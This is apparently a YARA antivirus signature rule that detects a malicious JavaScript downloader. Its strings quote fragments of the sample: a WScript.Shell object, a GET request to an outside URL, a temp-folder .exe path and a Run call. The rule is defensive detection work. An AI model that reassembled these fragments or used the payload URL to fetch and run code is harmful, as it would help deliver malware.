rule sig_20160328_ad3f4f6d468a355f2c7e3465b72fdac9 {
  meta:
    description = "datamaliciousorder - file 20160328_ad3f4f6d468a355f2c7e3465b72fdac9.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "15e8cb91fdb399d596587853619e432dd2d2a2fab060b21af2390ee18ad860ca"

  strings:
    $s1  = "function Uiwuqsi() {return Jcsyakevlq[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"yg5pO0M7.exe\";};" fullword ascii
    $s2  = "do {WScript[Xrcvjhk](Ssyhcjsk() * 11)} while (Zgwbjt[\"readystate\"] < 4 );" fullword ascii
    $s3  = "Zgwbjt[Hzsiawob](\"GET\", \"http://www.creative-drumschool.de/p3isakd\", false);" fullword ascii
    $s4  = "var Jcsyakevlq = function Mtjwzmp() {return WScript[Efwbtj](\"WScript.Shell\");}();" fullword ascii
    $s5  = "function Neblmil(Apwkumri, Dvsbilqsen){return Apwkumri - Dvsbilqsen;};" fullword ascii
    $s6  = "function Xkpobw() {return ((Crkhkvr == true) && (Crkhkvr == Dpurydod)) ? 1 : Ypdqnwdjm;};" fullword ascii
    $s7  = "function Dgncmiunu(Johdh){Jcsyakevlq[\"Run\"](Johdh, Ypdqnwdjm, Ypdqnwdjm);};" fullword ascii
    $s8  = "function Qfmcotv(){return Efwbtj;};" fullword ascii
    $s9  = "var Dpurydod = false;" fullword ascii
    $s10 = "return Neblmil(Pfzzwj, Clkbf);" fullword ascii
    $s11 = " while (Kthiqmfyqz){" fullword ascii
    $s12 = "function Ssyhcjsk(){return 22;};" fullword ascii
    $s13 = "Crkhkvr = true; " fullword ascii
    $s14 = "var Fkgxg = new this[\"Date\"]();" fullword ascii
    $s15 = "var Dmbhtlvlda = false;" fullword ascii
    $s16 = "var Crkhkvr = false;" fullword ascii
    $s17 = "function Pqrtq()" fullword ascii
    $s18 = "function Gyxvmfen(){return Utztbqp;};" fullword ascii
    $s19 = "function Gcrblmv(Biqgavcnx) {var Lkwszr = (1, 2, 3, 4, 5, Biqgavcnx); return Lkwszr;};" fullword ascii
    $s20 = "Dpurydod = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}